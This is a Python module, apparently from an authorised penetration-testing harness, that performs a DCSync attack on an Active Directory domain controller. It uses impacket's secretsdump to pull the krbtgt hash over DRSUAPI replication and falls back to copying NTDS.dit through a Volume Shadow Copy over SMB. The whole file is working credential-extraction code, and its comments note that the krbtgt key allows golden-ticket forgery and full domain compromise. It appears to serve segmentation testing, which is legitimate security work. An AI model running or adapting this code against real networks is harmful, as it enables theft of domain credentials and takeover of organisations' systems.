"""DCSync via impacket-secretsdump. Tests segmentation (RPC replication).

For a target registered in modules/_portpatch.py:CUSTOM_PORT_TARGETS
(real SMB(445)/RPC(135) not directly reachable, only NAT-forwarded
alternates are — see test2.py for the full writeup), this switches to
calling impacket's NTDSHashes/RemoteOperations in-process instead of
shelling out to the impacket-secretsdump CLI, since only an in-process
call can be patched (a subprocess doesn't inherit our socket redirect).
For every other target, behaviour is byte-for-byte the same
ctx.run_cmd(...) call as before — this only changes anything for a
registered NAT'd target.

The in-process path uses the DRSUAPI (remote replication) method first —
that IS DCSync (T1003.006), impacket-secretsdump's default. But a cloud /
NAT'd target (159/167) often forwards only SMB(445)/RPC-EPM(135): the EPM
hands back the DRSUAPI endpoint on the DC's INTERNAL IP + a DYNAMIC high
port that the NAT doesn't forward, so DRSGetNCChanges can't connect and
times out (RPC-over-NAT). For THOSE targets only, when DRSUAPI is
unreachable, this falls back to the VSS method (Volume Shadow Copy of
NTDS.dit over SMB/445, which DOES traverse the 445 forward) and labels the
result `[VSS-FALLBACK]`. VSS is a DIFFERENT technique (T1003.003, NTDS.dit
theft — not RPC replication), so the fallback is always tagged and never
silently reported as DRSUAPI/DCSync: the row still proves the DC's secrets
are extractable through the boundary, while making clear replication itself
did not traverse. (Set HARNESS_DCSYNC_NO_VSS=1 to disable the fallback and
keep DRSUAPI-only, e.g. to assert RPC-replication segmentation.)
"""
import io
import os
import re
import contextlib

from modules import _portpatch

META = {
    "id": "dcsync",
    "name": "DCSync",
    "category": "AD Exploitation",
    "test_type": "pentest",
    "control": "Segmentation (RPC replication)",
    "fix": "SD-WAN",
    "mitre": ['T1003.006'],
    "cwe": [],
    "tactic": 'Credential Access',
    "requires": [],                 # resolved at runtime across impacket flavours
    "requires_py": ["impacket"],    # the real dependency (CLI name varies)
    "serial": True,  # in-process impacket + _portpatch swap process-global socket.connect / redirect stdout — must run ALONE or threads pollute each other's output (NO-RESULT) and un-patch mid-connection
    "ports": [("tcp", 445), ("tcp", 135)],
    "success_regex": r"aad3b435|:::|krbtgt:|Kerberos keys grabbed",
    "blocked_regex": r"timed out|Connection refused|unreachable|Errno|STATUS_",
}


def _dump(remote_ops, use_vss, boot_key, just_user, ntds_file=None):
    """One NTDSHashes dump into a buffer; returns the captured text (raises on error).
    For VSS, ntds_file is the shadow-copied NTDS.dit retrieved via remote_ops.saveNTDS()."""
    from impacket.examples.secretsdump import NTDSHashes
    buf = io.StringIO()
    ntds = NTDSHashes(
        ntds_file, boot_key, isRemote=True, history=False, noLMHash=True,
        remoteOps=remote_ops, useVSSMethod=use_vss, justNTLM=False,
        pwdLastSet=False, resumeSession=None, outputFileName=None,
        justUser=just_user, printUserStatus=True,
    )
    with contextlib.redirect_stdout(buf):
        ntds.dump()
    ntds.finish()
    return buf.getvalue()


def _run_in_process(target, ctx):
    header = "# DCSync (in-process impacket) vs %s [custom-port patch active]\n\n" % target
    _portpatch.install(target)
    remoteOps = None
    try:
        from impacket.examples.secretsdump import RemoteOperations
        from impacket.smbconnection import SMBConnection

        smbConnection = SMBConnection(target, target, sess_port=445)
        smbConnection.login(ctx.creds["dc_user"], ctx.creds["dc_pass"], ctx.creds["domain"])
        remoteOps = RemoteOperations(smbConnection, False, None)
        # enableRegistry is best-effort for DRSUAPI (it doesn't need it) but REQUIRED
        # for the VSS fallback (boot key); a failure here only matters if we fall back.
        try:
            remoteOps.enableRegistry()
        except Exception:
            pass

        # 1) DRSUAPI replication — this IS DCSync (T1003.006), scoped to krbtgt.
        drs_err = None
        try:
            out = _dump(remoteOps, use_vss=False, boot_key=None, just_user="krbtgt")
            if re.search(META["success_regex"], out):
                return header + out                       # real DCSync via DRSUAPI replication
            drs_err = "DRSUAPI returned no secrets"
        except Exception as e:
            drs_err = "%s: %s" % (type(e).__name__, e)    # typically a connect/timeout (RPC-over-NAT)

        # 2) VSS fallback (only reached for cloud/NAT'd targets, which use this
        #    in-process path): DRSUAPI's dynamic RPC endpoint isn't reachable through
        #    the NAT, so pull NTDS via a Volume Shadow Copy over SMB/445 — a DIFFERENT
        #    technique (T1003.003), always LABELLED so it's never mistaken for DCSync.
        if os.environ.get("HARNESS_DCSYNC_NO_VSS", "").strip().lower() in ("1", "true", "yes"):
            return (header + "[ERROR] DRSUAPI (DCSync) unreachable (%s) and the VSS fallback is "
                    "disabled (HARNESS_DCSYNC_NO_VSS=1) — RPC replication did not traverse.\n" % drs_err)
        try:
            boot_key = remoteOps.getBootKey()
            try:
                remoteOps.setExecMethod("smbexec")
            except Exception:
                pass
            # saveNTDS() creates a shadow copy and retrieves NTDS.dit over SMB/445,
            # returning the retrieved file for NTDSHashes to parse (the step the
            # VSS path needs; without it the dumper finds nothing).
            ntds_file = remoteOps.saveNTDS()
            vout = _dump(remoteOps, use_vss=True, boot_key=boot_key, just_user=None, ntds_file=ntds_file)
        except Exception as e2:
            import traceback
            return (header + "[ERROR] DRSUAPI (DCSync) unreachable (%s) AND the VSS fallback failed: "
                    "%s: %s\n%s" % (drs_err, type(e2).__name__, e2, traceback.format_exc()))
        # scope the VSS dump to krbtgt (+ count) so evidence stays clean, mirroring the
        # DRSUAPI path's -just-dc-user krbtgt.
        krb = [l for l in vout.splitlines() if "krbtgt:" in l.lower()]
        n = sum(1 for l in vout.splitlines() if re.search(r":\d+:aad3b435", l))
        note = ("[VSS-FALLBACK] DRSUAPI/DCSync replication was UNREACHABLE through the cloud NAT "
                "(%s) — its dynamic RPC endpoint isn't forwarded (only SMB/445 is). Extracted NTDS "
                "secrets via a Volume Shadow Copy over SMB/445 instead (T1003.003 — a DIFFERENT "
                "technique than RPC-replication DCSync). The DC's secrets ARE extractable through "
                "the boundary; replication itself did not traverse.\n" % drs_err)
        body = ("\n".join(krb) + "\n[VSS dumped %d account(s); showing krbtgt]\n" % n) if krb else vout
        return header + note + body
    except Exception as e:
        import traceback
        return header + "\n[ERROR] %s: %s\n%s" % (type(e).__name__, e, traceback.format_exc())
    finally:
        if remoteOps is not None:
            try:
                remoteOps.finish()      # stop RemoteRegistry + delete the shadow copy / temp NTDS.dit
            except Exception:
                pass
        _portpatch.remove()


def run(target, ctx):
    # DCSync replicates secrets over authenticated DRSUAPI — it needs valid
    # domain creds. With no password the impacket tool would prompt getpass
    # (now EOFs cleanly thanks to the detached stdin) and produce noise; skip
    # with a clear reason instead, like kerberoast/ssh_brute.
    if not (ctx.creds.get("dc_pass") or "").strip():
        return ("# dcsync vs %s\n\n[SKIP] no domain password configured (set "
                "HARNESS_DC_PASS / --dc-pass / credentials.env) — DCSync needs "
                "valid DC creds to replicate secrets." % target)
    if _portpatch.is_custom_port_target(target):
        return _run_in_process(target, ctx)
    from modules import _impacket
    tool = _impacket.resolve("secretsdump")
    if not tool:
        return ("# dcsync vs %s\n\n[SKIP] impacket not installed — secretsdump "
                "unavailable (pip install impacket / apt python3-impacket)." % target)
    return ctx.run_cmd(
        # DCSync of JUST krbtgt — CONSISTENT with the in-process path above (which
        # uses justUser="krbtgt"). krbtgt is the DCSync crown jewel (its key forges
        # golden tickets = full-domain compromise), so pulling only it proves the
        # attack while avoiding dumping every account's hash into evidence. You do
        # NOT need -just-dc-user to "do DCSync" — a bare secretsdump dumps the whole
        # domain via the same DRSUAPI replication; this is just the scoped, cleaner
        # PoC. Drop the flag here (and set justUser=None above) for a full dump.
        tool + " {domain}/{dc_user}:{dc_pass}@{target} -just-dc-user krbtgt", target)
